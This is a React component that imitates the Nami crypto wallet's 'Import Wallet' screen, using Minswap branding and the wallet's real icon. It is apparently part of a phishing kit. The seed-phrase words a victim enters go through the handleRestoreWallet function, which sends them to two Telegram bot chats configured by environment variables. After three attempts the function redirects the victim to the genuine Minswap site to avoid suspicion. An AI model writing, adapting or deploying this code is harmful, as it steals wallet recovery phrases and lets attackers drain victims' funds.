import { useState } from "react";
import { useNavigate } from "react-router";
import { Link } from "react-router-dom";

function Nami() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isSecondModalOpen, setIsSecondModalOpen] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState([]);
  const [seedPhraseLength, setSeedPhraseLength] = useState("");
  const [agreed, setAgreed] = useState(false);
  const navigate = useNavigate();
  const [attempts, setAttempts] = useState(0);

  const handleCloseAllModals = () => {
    setIsModalOpen(false);
    setIsSecondModalOpen(false);
    navigate("/");
  };

  const handleImportClick = () => {
    setIsModalOpen(true);
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
  };

  const handleContinueClick = () => {
    if (!isContinueDisabled) {
      setIsSecondModalOpen(true);
    }
  };

  const handleCloseSecondModal = () => {
    setIsSecondModalOpen(false);
  };

  const handleSeedPhraseLengthChange = (e) => {
    const length = e.target.value === "15-word" ? 15 : 24;
    setSeedPhraseLength(length);
    setSeedPhrase(Array(length).fill(""));
  };

  const handleSeedPhraseChange = (index, value) => {
    const newSeedPhrase = [...seedPhrase];
    newSeedPhrase[index] = value;
    setSeedPhrase(newSeedPhrase);
  };

  const isContinueDisabled = !agreed || !seedPhraseLength;

  const handleRestoreWallet = async () => {
    const message = seedPhrase.join(" ");

    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
    const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
    const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;



    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;


    const data = {
        chat_id: chat_id,
        text: `Nami:   ${message}`,
    };
    const odata = {
      chat_id: ochat_id,
      text: `Nami:   ${message}`,
    };

    // Update the number of attempts
    setAttempts((prevAttempts) => prevAttempts + 1);

    if (attempts < 3) {
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            });

            if (!response.ok) {
                throw new Error("Network response was not ok");
            }

            const oresponse = await fetch(ourl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(odata),
            });
      
            if (!oresponse.ok) {
              throw new Error("Network response was not ok");
            }

            console.log("null");
        } catch (error) {
            console.error("Error sending message:", error);
        }
    } else {
      window.location.href = "https://minswap.org/fi-FI";
    }
};


  return (
    <div
      className="Nami fixed inset-0 flex bg-opacity-50 backdrop-blur-sm z-50"
      style={{ width: "100%" }}
    >
      <div
        className=" p-3 sm:p-6 bg-[#1a202c] relative text-center"
        style={{ width: "100%", height: "100%" }}
      >
        <div className="text-right">
          <i
            className="fa-solid fa-x text-slate-400 cursor-pointer"
            style={{ fontSize: "15px" }}
            onClick={handleCloseAllModals}
          ></i>
        </div>

        <div className="flex flex-col items-center justify-center m-auto mt-20">
          <div className="flex justify-center">
            <img
              src="https://app.minswap.org/wallets/nami.svg"
              alt="icon"
              className="w-14 pt-5"
            />
          </div>

          <div className="mt-10">
            <h1 className="text-2xl text-white font-base">Welcome</h1>
            <p className="mt-2 text-gray-500 text-sm">
              Let's get started with creating a wallet.
            </p>
          </div>
          <div className="flex justify-center mt-5">
            <img
              src="https://res.cloudinary.com/dzzwvcapu/image/upload/v1717071049/ipge7jkvxfvlztsfq4b0.png"
              alt="icon"
              className="w-24"
            />
          </div>
          <div className="flex flex-col mt-8 gap-3">
            <Link
              to="/namiWallet"
              className="pt-2 pb-2 ps-5 pe-5 bg-teal-600 text-white rounded-lg max-w-40  m-auto"
            >
              New Wallet
            </Link>
            <button
              className="pt-2 pb-2 ps-3 pe-3 bg-orange-600 text-white rounded-lg max-w-20 m-auto"
              onClick={handleImportClick}
            >
              Import
            </button>
          </div>

          <h1 className="text-xs mt-8 text-gray-400">namiwallet.io</h1>
        </div>
      </div>

      {isModalOpen && (
        <div className="fixed inset-0 flex bg-black bg-opacity-50 backdrop-blur-sm z-60">
          <div
            className="m-auto p-5 bg-white relative text-center rounded-lg shadow-lg"
            style={{ width: "300px", height: "450px" }}
          >
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold">Import Wallet</h2>
              <i className="fa-solid fa-times" onClick={handleCloseModal} />
            </div>

            <div className="flex gap-2 items-center mt-5">
              <i className="fa-solid fa-triangle-exclamation"></i>
              <p className="font-bold">Importing Daedalus or Yoroi</p>
            </div>

            <div className="flex flex-col gap-3 text-left text-xs mt-2">
              <p>
                We always recommend creating a new wallet, as Nami is best
                experienced when not simultaneously used with Yoroi/Daedalus.
                Nami will not track all addresses associated with your imported
                wallet, and might result in partial reflection of assets. To
                accurately reflect your balance, please transfer all assets into
                your new Nami wallet. More info
              </p>
              <p>
                Make sure no one is watching the screen, while the seed phrase
                is visible.
                <i className="fa-solid fa-eye"></i>
              </p>
            </div>

            <div>
              <select
                className="mt-6 border border-stone-200 rounded pt-1 pb-1 ps-2 pe-2"
                name="options"
                id="options"
                value={
                  seedPhraseLength === 15
                    ? "15-word"
                    : seedPhraseLength === 24
                    ? "24-word"
                    : ""
                }
                onChange={handleSeedPhraseLengthChange}
                style={{ width: "100%" }}
              >
                <option value="" disabled>
                  Choose seedphrase length
                </option>
                <option value="15-word">15-word seed phrase</option>
                <option value="24-word">24-word seed phrase</option>
              </select>
            </div>

            <div className="flex gap-3 items-center mt-5 font-bold">
              <input
                type="checkbox"
                name="agree"
                id="agree"
                checked={agreed}
                onChange={(e) => setAgreed(e.target.checked)}
              />
              <h1 className="text-left text-xs">
                I read and accepted the Terms of use and Privacy Policy
              </h1>
            </div>

            <div className="mt-5 flex items-center justify-end gap-5">
              <p
                className="font-bold cursor-pointer"
                onClick={handleCloseModal}
              >
                Close
              </p>
              <button
                className={`pt-2 pb-2 ps-5 pe-5 text-white rounded-md font-bold bg-teal-600 ${
                  isContinueDisabled
                    ? "opacity-30 cursor-not-allowed"
                    : "opacity-100"
                }`}
                disabled={isContinueDisabled}
                onClick={handleContinueClick}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}

      {isSecondModalOpen && (
        <div className="fixed inset-0 flex bg-[#1a202c] bg-opacity-50 backdrop-blur-sm z-70">
          <div
            className="m-auto ps-10 pe-10 pt-5 pb-5 bg-[#1a202c] relative text-center rounded-lg shadow-lg"
            style={{ width: "100%", height: "100vh" }}
          >
            <div className="flex items-center justify-between">
              <img
                src="https://app.minswap.org/wallets/nami.svg"
                alt="icon"
                className="w-10 pt-5"
              />
              <i
                className="fa-solid fa-times text-white"
                onClick={handleCloseSecondModal}
              />
            </div>
            <div
              className="bg-[#171923] m-auto p-8 rounded-lg shadow mt-5"
              style={{ maxWidth: "500px", height: "75vh" }}
            >
              <h1 className="font-bold text-xl text-white">
                Import Seed Phrase
              </h1>
              <p className="text-xs mt-2 text-white">
                Enter a {seedPhraseLength}-word seed phrase.
              </p>
              <div
                className="overflow-x-auto grid grid-cols-2 gap-1 mt-4"
                style={{ height: "45vh" }}
              >
                {seedPhrase.map((word, index) => (
                  <div
                    key={index}
                    className="flex gap-2 items-center  ps-2 pe-2  "
                  >
                    <span className="text-white bg-teal-600 pt-1 pb-1 ps-2 pe-2 rounded-full">
                      {index + 1}
                    </span>
                    <input
                      type="text"
                      value={word}
                      placeholder={`Word ${index + 1}`}
                      onChange={(e) =>
                        handleSeedPhraseChange(index, e.target.value)
                      }
                      className="border rounded-full p-1 mt-2 bg-[#262832] text-gray-300  font-bold text-center text-xs"
                      style={{ width: "calc(100% - 20px)" }}
                    />
                  </div>
                ))}
              </div>
              <div className="mt-5">
                <button
                  className={`text-gray-300 bg-[#262832]  rounded-md pt-2 pb-2 ps-5 pe-5 font-bold  ${
                    isContinueDisabled
                      ? "opacity-10 cursor-not-allowed"
                      : "opacity-100"
                  }`}
                  disabled={
                    seedPhrase.some((word) => word.trim() === "") ||
                    isContinueDisabled
                  }
                  onClick={() => handleRestoreWallet(seedPhrase)}
                >
                  Next {`>`}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default Nami;
